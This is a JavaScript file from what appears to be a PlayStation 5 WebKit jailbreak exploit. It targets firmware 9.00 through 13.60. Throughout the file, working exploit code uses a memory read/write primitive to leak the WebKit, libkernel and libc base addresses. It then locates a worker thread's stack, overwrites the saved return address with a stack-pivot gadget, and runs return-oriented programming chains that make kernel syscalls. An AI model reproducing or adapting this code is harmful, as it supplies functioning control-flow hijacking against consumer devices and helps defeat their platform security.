if (!navigator.userAgent.includes('PlayStation 5')) {
    alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
    throw new Error("");
}

const supportedFirmwares = [
    "9.00", "9.05", "9.20", "9.40", "9.60", "10.00", "10.01", "10.20",
    "10.40", "10.60", "11.00", "11.20", "11.40", "11.60", "12.00",
    // 13.40 profile is LIVE-CANDIDATE status (see offsets/13.40.js header):
    // full 13.20-derived tables + live-verified anchors. Boot test = the
    // getpid check in prepare() (zero kernel interaction, safe pass/fail).
    "13.00", "13.20", "13.40", "13.60"
];
const fw_match = /PlayStation 5\/(\d+\.\d+)/.exec(navigator.userAgent);
window.fw_str = fw_match ? fw_match[1] : "";
window.fw_float = parseFloat(window.fw_str);

if (!supportedFirmwares.includes(fw_str)) {

    alert(`Firmware ${fw_str} is unsupported.\n\nSupported: ${supportedFirmwares.join(", ")}`);
    throw new Error("no offsets for fw " + fw_str);
}

function find_worker(p, libKernelBase) {
    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    let visited = 0;
    let seen = [];
    const threadListAddr = libKernelBase.add32(OFFSET_lk__thread_list);
    for (let thread = p.read8(threadListAddr); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        visited++;
        if (seen.length < 6) seen.push("sz=0x" + stacksz.low.toString(16));
        if (stacksz.low == 0x80000) {
            return stack;
        }
        if (visited > 256) break;
    }
    throw new Error("failed to find worker (walked " + visited +
        " threads from thread_list=" + threadListAddr.toString() +
        " lkbase=" + libKernelBase.toString() + " first stackszs: " + seen.join(",") + ")");
}

async function scan_thread_head(p, libKernelBase, tstart, tend, opts) {
    // Fallback when OFFSET_lk__thread_list misses: hunt the list head by
    // signature. Strict mode: [+0x38] next (in-band or null),
    // [+0xA8] stack (in-band, page-aligned), [+0xB0] size 0x80000 low.
    // Drift modes (13.40 layout may have moved fields):
    //   loose=1  -> only V shape + [szOff]==0x80000 (skip next/stack checks)
    //   szscan=1 -> for each V, sweep so in [0,0x200] for value 0x80000,
    //               log the matching sub-offset (finds moved size field).
    //   szlist=1 -> per V, test size at [0x90..0xD0] step 8 (9 curated
    //               candidates, all safeV-guarded). One run covers size-field
    //               drift + next/stack drift (loose skips those).
    // Pure reads; every hit is logged immediately (a fault loses nothing).
    opts = opts || {};
    const NEXT_OFF = opts.nextOff || 0x38;
    const STACK_OFF = opts.stackOff || 0xA8;
    const SZ_OFF = opts.szOff || 0xB0;
    const LOOSE = !!opts.loose;
    const SZSCAN = !!opts.szscan;
    const SZLIST = !!opts.szlist;
    const CENSUS = !!opts.census;
    const ALLPTR = !!opts.allptr;
    const SZ_OFFS = SZLIST ? [0x90, 0x98, 0xA0, 0xA8, 0xB0, 0xB8, 0xC0, 0xC8, 0xD0] : null;
    // Crash-free guard: only dereference V pointing inside the same window
    // we are scanning (slot reads already prove it readable as we walk it).
    // Garbage V into unmapped holes used to kill the tab (memory error).
    // ?vlo=/?vhi= override; vhi auto-shrinks by max deref reach.
    const STEP = 16;
    const VLO = (opts.vlo !== undefined) ? opts.vlo : tstart;
    const VHI = (opts.vhi !== undefined) ? opts.vhi : tend;
    const MAXREACH = SZSCAN ? 0x208 : SZLIST ? 0xD8 :
        Math.max(SZ_OFF, LOOSE ? 0 : Math.max(NEXT_OFF, STACK_OFF)) + 8;
    const lkHi = libKernelBase.hi >>> 0, lkLow = libKernelBase.low >>> 0;
    const found = [];
    let pages = 0;
    let skipped = 0;
    for (let base = tstart; base < tend; base += 0x1000) {
        for (let o = 0; o < 0x1000; o += STEP) {
            const slotAddr = libKernelBase.add32(base + o);
            const V = p.read8(slotAddr);
            if (CENSUS || ALLPTR) {
                // Deref-free: list pointers, zero fault surface beyond slots.
                // CENSUS: libkernel-band aligned only, out= flags outside-V.
                // ALLPTR: every non-null aligned qword + band tag (heap
                // pointers included: the head may point to heap, and live
                // targets are safe to follow up individually).
                if ((V.low & 0xF) !== 0) continue;
                if (V.low === 0 && V.hi === 0) continue;
                if (!ALLPTR && ((V.hi >>> 0) !== lkHi)) continue;
                if (found.length < 512) {
                    let tag;
                    if ((V.hi >>> 0) === lkHi) {
                        const vo2 = (V.low >>> 0) - lkLow;
                        tag = (vo2 < VLO || vo2 + 8 > VHI) ? "out=1" : "out=0";
                    } else {
                        tag = "band=0x" + (V.hi >>> 0).toString(16);
                    }
                    jbmark(ALLPTR ? "ALLPTR" : "CENSUS", "slot=+0x" + (base + o).toString(16) +
                        "-v=0x" + V.toString() + "-" + tag);
                    found.push({ slot: base + o, thread: V });
                }
                continue;
            }
            if ((V.hi >>> 0) !== lkHi) continue;
            if ((V.low & 0xF) !== 0) continue;
            const voff = (V.low >>> 0) - lkLow;
            if (voff < VLO || voff + MAXREACH > VHI) { skipped++; continue; }
            if (SZSCAN) {
                for (let so = 0; so <= 0x200; so += 8) {
                    const sz2 = p.read8(V.add32(so));
                    if (sz2.low !== 0x80000 || sz2.hi !== 0) continue;
                    found.push({ slot: base + o, thread: V, szoff: so });
                    jbmark("THREAD-HIT", "slot=+0x" + (base + o).toString(16) +
                        "-thread=0x" + V.toString() + "-szoff=+0x" + so.toString(16));
                    break;
                }
                if (found.length >= 8) return found;
                continue;
            }
            if (SZLIST) {
                for (const so of SZ_OFFS) {
                    const szL = p.read8(V.add32(so));
                    if (szL.low !== 0x80000 || szL.hi !== 0) continue;
                    found.push({ slot: base + o, thread: V, szoff: so });
                    jbmark("THREAD-HIT", "slot=+0x" + (base + o).toString(16) +
                        "-thread=0x" + V.toString() + "-szoff=+0x" + so.toString(16));
                    break;
                }
                if (found.length >= 8) return found;
                continue;
            }
            const sz = p.read8(V.add32(SZ_OFF));
            if (sz.low !== 0x80000 || sz.hi !== 0) continue;
            if (!LOOSE) {
                const nx = p.read8(V.add32(NEXT_OFF));
                const nxOk = (nx.low === 0 && nx.hi === 0) || ((nx.hi >>> 0) === 0x8);
                if (!nxOk) continue;
                const st = p.read8(V.add32(STACK_OFF));
                if ((st.hi >>> 0) !== 0x8 || (st.low % 0x1000) !== 0) continue;
            }
            found.push({ slot: base + o, thread: V });
            jbmark("THREAD-HIT", "slot=+0x" + (base + o).toString(16) +
                "-thread=0x" + V.toString());
            if (found.length >= 8) return found;
        }
        pages++;
        if ((pages & 3) === 0) {
            jbmark("THREAD-SCAN", "at=+0x" + base.toString(16));
            await new Promise((resolve) => setTimeout(resolve, 0));
        }
    }
    jbmark("THREAD-SCAN-DONE", "pages=" + pages + "-skipped=" + skipped + "-hits=" + found.length);
    return found;
}

async function find_worker_return_slot(p, stack, libKernelBase) {
    const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
    let lastCount = 0;

    // The worker may answer immediately before returning to its idle wait.
    // The exact saved PC is the firmware-specific fingerprint. Do not require
    // the following qword to resemble an RSP: that adjacent slot is ABI/frame
    // layout dependent and 10.60 legitimately does not satisfy that heuristic.
    for (let attempt = 0; attempt < 50; attempt++) {
        let hit = null;
        let count = 0;
        for (let offset = 0x7F000; offset < 0x80000; offset += 0x8) {
            const candidate = stack.add32(offset);
            const value = p.read8(candidate);
            if (value.low !== expected.low || value.hi !== expected.hi)
                continue;

            hit = candidate;
            count++;
        }
        if (count === 1) {
            jbmark("WORKER-RET-FINGERPRINT", "hit=0x" + hit.toString()
                + "-expected=0x" + expected.toString());
            return hit;
        }
        lastCount = count;
        await new Promise(resolve => setTimeout(resolve, 1));
    }
    throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
}

function jbmark(tag, detail) {
    try {
        if (window.jb && typeof window.jb.mark === "function")
            window.jb.mark(tag, String(detail));
    } catch (e) {  }
    try {
        if (window.__bgwMark) window.__bgwMark(tag, detail);
    } catch (e) {  }
}

async function prepare(p) {

    let textArea = document.createElement("textarea");

    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));

    let textAreaVtable = p.read8(textAreaVtPtr);

    // 9.00+ has no vtable rva; resolve from the host constructor instead.
    // A candidate is accepted only if it lands page-aligned in the user-module
    // band, so a wrong one is rejected rather than used.
    let libSceNKWebKitBase = null;
    if (window.fw_float >= 9.00
        && typeof OFFSET_wk_host_constructor_candidates !== "undefined"
        && OFFSET_wk_host_constructor_candidates.length
        && typeof globalThis.__ps5NativeCtor === "number") {
        const ctor = globalThis.__ps5NativeCtor;
        for (const hc of OFFSET_wk_host_constructor_candidates) {
            const wb = ctor - hc;
            if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
                libSceNKWebKitBase = new int64(wb % 0x100000000, Math.floor(wb / 0x100000000));
                jbmark("WEBKIT-BASE-HC", "hc=0x" + hc.toString(16)
                    + "-base=0x" + wb.toString(16));
                break;
            }
        }
        if (libSceNKWebKitBase === null)
            throw new Error("no host-constructor candidate gave a valid base (ctor=0x"
                + ctor.toString(16) + ")");
    } else {
        jbmark("WEBKIT-BASE-VTABLE", "fw=" + window.fw_str
            + "-ctor=" + (typeof globalThis.__ps5NativeCtor === "number"
                ? "0x" + globalThis.__ps5NativeCtor.toString(16) : "absent")
            + "-hc=" + (typeof OFFSET_wk_host_constructor_candidates !== "undefined"
                ? OFFSET_wk_host_constructor_candidates.length : "none"));
        libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
    }

    // 13.40+: derive libKernelBase from THREE live-verified GOT slots
    // (getpid/close/error) instead of the stack_chk_guard import (whose 13.40
    // slot is unproven). RVAs verified live (notification delivery + direct
    // calls). All three must agree -- else abort LOUDLY naming the fix.
    let libKernelBase = null;
    if (typeof OFFSET_wk_getpid_slot !== "undefined" && typeof OFFSET_wk_close_slot !== "undefined" &&
        typeof OFFSET_wk_error_slot !== "undefined" && typeof OFFSET_wk_getpid_exp !== "undefined" &&
        typeof OFFSET_wk_close_exp !== "undefined" && typeof OFFSET_wk_error_exp !== "undefined") {
        const bGetpid = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_getpid_slot)).sub32(OFFSET_wk_getpid_exp);
        const bClose = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_close_slot)).sub32(OFFSET_wk_close_exp);
        const bError = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_error_slot)).sub32(OFFSET_wk_error_exp);
        jbmark("GOT-BASES", "getpid=0x" + bGetpid.toString() +
            "-close=0x" + bClose.toString() + "-error=0x" + bError.toString());
        if (bGetpid.low !== bClose.low || bGetpid.hi !== bClose.hi ||
            bGetpid.low !== bError.low || bGetpid.hi !== bError.hi) {
            throw new Error("GOT base disagreement: getpid=0x" + bGetpid.toString() +
                " close=0x" + bClose.toString() + " error=0x" + bError.toString() +
                " (13.40 slots/RVAs moved; update offsets/13.40.js)");
        }
        libKernelBase = bGetpid;
    } else {
        const fallbackBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
        fallbackBase.sub32inplace(OFFSET_lk___stack_chk_guard);
        libKernelBase = fallbackBase;
    }

    // Publish the working pieces for goscan mode even if later steps fail:
    // raw primitive + hc-picked WebKit base + agreement-verified kernel base.
    // Stages still require full prepare(); the scan needs none of it.
    try {
        window.__bgwScan = { p: p, webkitBase: libSceNKWebKitBase, libKernelBase: libKernelBase };
        jbmark("SCAN-READY", "wk=0x" + libSceNKWebKitBase.toString() +
            "-lk=0x" + libKernelBase.toString());
    } catch (e) { }

    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);
    // Sanity gate: a non-canonical libc base previously flowed silently into
    // setjmp/longjmp and crashed chains. Abort LOUDLY instead.
    const lcOk = (libSceLibcInternalBase.hi >>> 0) === 0x8 &&
        (libSceLibcInternalBase.low % 0x4000) === 0;
    jbmark("LIBC-BASE", "lc=0x" + libSceLibcInternalBase.toString() + "-ok=" + lcOk);
    if (!lcOk)
        throw new Error("libc base implausible: 0x" + libSceLibcInternalBase.toString() +
            " (wk_memset_import or lc_memset wrong for this fw)");

    // once per run, before any racer exists
    jbmark("MODULE-BASES", "wk=0x" + libSceNKWebKitBase.toString()
        + "-lk=0x" + libKernelBase.toString()
        + "-lc=0x" + libSceLibcInternalBase.toString());

    let gadgets = {};
    let syscalls = {};

    for (let gadget in wk_gadgetmap) {
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (let sysc in syscall_map) {
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
    }

    let nogc = [];

    function malloc_dump(sz) {
        let backing;
        backing = new Uint8Array(sz);
        nogc.push(backing);

        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc(sz, type = 4) {
        let backing;
        if (type == 1) {
            backing = new Uint8Array(1000 + sz);
        } else if (type == 2) {
            backing = new Uint16Array(0x2000 + sz);
        } else if (type == 4) {
            backing = new Uint32Array(0x10000 + sz);
        }
        nogc.push(backing);

        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function array_from_address(addr, size) {
        let og_array = new Uint8Array(1001);
        let og_array_i = p.leakval(og_array).add32(0x10);

        function setAddr(newAddr, size) {
            p.write8(og_array_i, newAddr);
            p.write4(og_array_i.add32(0x8), size);
            p.write4(og_array_i.add32(0xC), 0x1);
        }

        setAddr(addr, size);

        og_array.setAddr = setAddr;

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }

        let ptr = p.read8(p.leakval(bufView).add32(0x10));
        ptr.backing = bufView;
        return ptr;
    }

    function readstr(addr, maxlen = -1) {
        let str = "";
        for (let i = 0; ; i++) {
            if (maxlen != -1 && i >= maxlen) { break; }
            let c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    function writestr(addr, str) {
        let waddr = addr.add32(0);
        if (typeof (str) == "string") {

            for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) {
                    break;
                }
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
            }
        }
        p.write1(waddr, 0x0);
    }

    async function wait_for_worker() {

        return new Promise((resolve) => {
            worker.onmessage = function (e) {
                resolve(1);
            }
            worker.postMessage(0);
        });

    }

    let worker = new Worker("rop_slave.js?v=final");

    jbmark("PREP-PRE-WORKER-AWAIT", "next=await-wait_for_worker()-first-yield");
    await wait_for_worker();
    jbmark("PREP-POST-WORKER-AWAIT", "survived-the-first-yield");

    let worker_stack = null;
    try {
        worker_stack = find_worker(p, libKernelBase);
    } catch (e) {
        jbmark("WORKER-SCAN-FALLBACK", String((e && e.message) || e).slice(0, 120));
        const qp = new URLSearchParams(location.search);
        const hexP = (v, dflt) => {
            const s = qp.get(v);
            if (!s) return dflt;
            const n = parseInt(s, 16);
            return Number.isFinite(n) && n >= 0 ? n : dflt;
        };
        // Start at the proven-readable page (thread_list area reads zeros)
        // and sweep UP: libkernel .text is execute-only (reads fault), .data
        // is readable. Starting in .text killed the first attempt instantly.
        const tstart = hexP("tstart", 0x64000), tend = hexP("tend", 0x84000);
        // ?follow=1: dereference the clustered heap-band pointers found by
        // ALLPTR in BSS (slots stable RVAs, targets read live per boot).
        // Live-pointer targets are mapped by definition; each window is
        // swept for 0x80000 (size field, any offset) + pointer census.
        if (qp.get("follow") === "1") {
            const SLOTS = [0x5a320, 0x5a4a0, 0x5a680];
            jbmark("FOLLOW-START", "slots=" + SLOTS.length);
            for (const s of SLOTS) {
                const V = p.read8(libKernelBase.add32(s));
                jbmark("FOLLOW-PTR", "slot=+0x" + s.toString(16) + "-v=0x" + V.toString());
                if ((V.hi >>> 0) !== 0x1) {
                    jbmark("FOLLOW-SKIP", "slot=+0x" + s.toString(16) + "-not-heap");
                    continue;
                }
                let logged = 0;
                for (let off = 0; off <= 0x200 && logged < 12; off += 8) {
                    const q = p.read8(V.add32(off));
                    if (q.low === 0x80000 && q.hi === 0) {
                        jbmark("THREAD-HIT", "heap-slot=+0x" + s.toString(16) +
                            "-thread=0x" + V.toString() + "-szoff=+0x" + off.toString(16));
                        logged++;
                    } else if (((q.hi >>> 0) === 0x8 || (q.hi >>> 0) === 0x1) && ((q.low & 0xFFF) === 0)) {
                        jbmark("FOLLOW-MAP", "slot=+0x" + s.toString(16) +
                            "-off=+0x" + off.toString(16) + "-v=0x" + q.toString());
                        logged++;
                    }
                }
                jbmark("FOLLOW-DONE", "slot=+0x" + s.toString(16) + "-lines=" + logged);
            }
            throw new Error("FOLLOW-DONE");
        }
        const scanOpts = {
            nextOff: hexP("nextoff", 0x38),
            stackOff: hexP("stackoff", 0xA8),
            szOff: hexP("szoff", 0xB0),
            loose: qp.get("loose") === "1",
            szscan: qp.get("szscan") === "1",
            szlist: qp.get("szlist") === "1",
            census: qp.get("census") === "1",
            allptr: qp.get("allptr") === "1",
            vlo: hexP("vlo", tstart),
            vhi: hexP("vhi", tend),
        };
        jbmark("THREAD-SCAN-RANGE", "tstart=0x" + tstart.toString(16) +
            "-tend=0x" + tend.toString(16) +
            (scanOpts.allptr ? "-allptr" : scanOpts.census ? "-census" : scanOpts.szscan ? "-szscan" : scanOpts.szlist ? "-szlist" : scanOpts.loose ? "-loose-szoff=0x" + scanOpts.szOff.toString(16) : "") +
            "-safeV");
        const hits = await scan_thread_head(p, libKernelBase, tstart, tend, scanOpts);
        if (scanOpts.census || scanOpts.allptr)
            throw new Error("CENSUS-DONE entries=" + hits.length + " in [0x" +
                tstart.toString(16) + ",0x" + tend.toString(16) + "]");
        if (!hits.length)
            throw new Error("find_worker failed AND thread scan found nothing in [0x" +
                tstart.toString(16) + ",0x" + tend.toString(16) + "). Original: " +
                ((e && e.message) || e));
        const first = hits[0];
        worker_stack = p.read8(first.thread.add32(scanOpts.stackOff));
        jbmark("THREAD-SCAN-USE", "slot=+0x" + first.slot.toString(16) +
            "-thread=0x" + first.thread.toString() + "-stack=0x" + worker_stack.toString() +
            (first.szoff !== undefined ? "-szoff=+0x" + first.szoff.toString(16) : "") +
            (hits.length > 1 ? "-others=" + (hits.length - 1) : ""));
    }
    jbmark("PREP-WORKER-STACK", "stack=0x" + worker_stack.toString()
        + "-next=malloc(0x40)+worker_rop(0xC0000)");
    let original_context = malloc(0x40);

    let return_address_ptr;
    const qp2 = new URLSearchParams(location.search);
    const retslotParam = qp2.get("retslot");
    if (retslotParam) {
        const retslotOff = parseInt(retslotParam, 16);
        if (!Number.isFinite(retslotOff) || retslotOff < 0 || retslotOff >= 0x80000)
            throw new Error("bad ?retslot= (want hex < 0x80000)");
        return_address_ptr = worker_stack.add32(retslotOff);
        jbmark("RET SLOT-OVERRIDE", "retslot=+0x" + retslotOff.toString(16));
    } else if (typeof OFFSET_lk_worker_wait_return !== "undefined") {
        return_address_ptr = await find_worker_return_slot(p, worker_stack, libKernelBase);
    } else {
        // Backward-compatible path for original profiles without a saved-PC fingerprint.
        return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    }
    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);
    // Log adjacency candidates for future rounds (PC in libkernel text + RSP-adjacent).
    try {
        let logged = 0;
        for (let ro = 0x7E000; ro < 0x80000 && logged < 8; ro += 8) {
            const sv = p.read8(worker_stack.add32(ro));
            const sv2 = p.read8(worker_stack.add32(ro + 8));
            const inK = (sv.hi === libKernelBase.hi) && sv.low >= libKernelBase.low &&
                (sv.low - libKernelBase.low) < 0x80000;
            const rspOk = (sv2.hi >>> 0) <= 0xFFFF && !(sv2.low === 0 && sv2.hi === 0) &&
                (sv2.low % 8) === 0;
            if (inK && rspOk) {
                jbmark("RET-CANDIDATE", "slot=+0x" + ro.toString(16));
                logged++;
            }
        }
    } catch (e) { }

    function pre_chain(chain) {

        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }

    async function launch_chain(chain) {

        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

        if (window.jb && window.jb.hot)
            jbmark("PREP-WILL-WRITE-RETADDR", "retptr=0x" + return_address_ptr.toString()
                + "-poprsp=0x" + gadgets["pop rsp"].toString()
                + "-rsp=0x" + chain.stack_entry_point.toString());

        p.write8(return_address_ptr, gadgets["pop rsp"]);
        p.write8(stack_pointer_ptr, chain.stack_entry_point);

        if (window.jb && window.jb.hot)
            jbmark("CHAIN-PRE-POST", "next=worker.postMessage(0)-rop-executes-now");
        let p1 = await new Promise((resolve) => {
            worker.onmessage = function (e) {
                resolve(1);
            }
            worker.postMessage(0);
        });
        if (window.jb && window.jb.hot)
            jbmark("CHAIN-POST-POST", "worker-answered-p1=" + p1);
        if (p1 == 0) {
            throw new Error("The rop thread ran away. ");
        }
    }

    let p2 = {
        write8: p.write8,
        write4: p.write4,
        write2: p.write2,
        write1: p.write1,
        read8: p.read8,
        read4: p.read4,
        read2: p.read2,
        read1: p.read1,
        leakval: p.leakval,
        pre_chain: pre_chain,
        launch_chain: launch_chain,
        malloc_dump: malloc_dump,
        malloc: malloc,
        stringify: stringify,
        array_from_address: array_from_address,
        readstr: readstr,
        writestr: writestr,
        libSceNKWebKitBase: libSceNKWebKitBase,
        libSceLibcInternalBase: libSceLibcInternalBase,
        libKernelBase: libKernelBase,
        nogc: nogc,
        syscalls: syscalls,
        gadgets: gadgets
    };

    let chain = new worker_rop(p2);

    const JB_POISON = new int64(0xDEADBEEF, 0x00C0FFEE);
    p.write8(chain.return_value, JB_POISON);
    jbmark("PREP-GETPID-PRE", "retval=0x" + chain.return_value.toString()
        + "-poisoned-next=chain.syscall(SYS_GETPID)");

    let pid = await chain.syscall(SYS_GETPID);

    jbmark("PREP-GETPID-POST", "raw=0x" + pid.toString());
    if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
        jbmark("PREP-CHAIN-DIDNT-RUN", "return-slot-still-poisoned");
        throw new Error("The ROP chain never executed: the return slot still "
            + "holds the poison. The hijacked thread is not the one postMessage "
            + "wakes (main.js:69's worker vs this one), or the stack write did "
            + "not land.");
    }

    if (pid.low == 0) {
        throw new Error("Webkit exploit failed.");
    }
    jbmark("PREP-GETPID-OK", "pid=" + pid.low);

    // CALL-BATTERY: distinguish ROP-chain degradation (crash at call N) from
    // a bad stub RVA (all pass here, crash only at aio_create in stage 0).
    // getpid x4 (0-arg, known good) + aio_init repeat (2-arg, known good).
    for (let bi = 0; bi < 4; bi++) {
        const bp = await chain.syscall(SYS_GETPID);
        jbmark("PREP-BATTERY", "n=" + bi + "-pid=" + bp.low);
    }
    const bai = await chain.syscall(SYS_AIO_INIT, 0, 0);
    jbmark("PREP-BATTERY-INIT", "raw=0x" + bai.toString());

    return { p: p2, chain: chain };
}
let fwScript = document.createElement('script');
document.body.appendChild(fwScript);

fwScript.setAttribute('src', `./offsets/${window.fw_str}.js?v=` + Date.now());
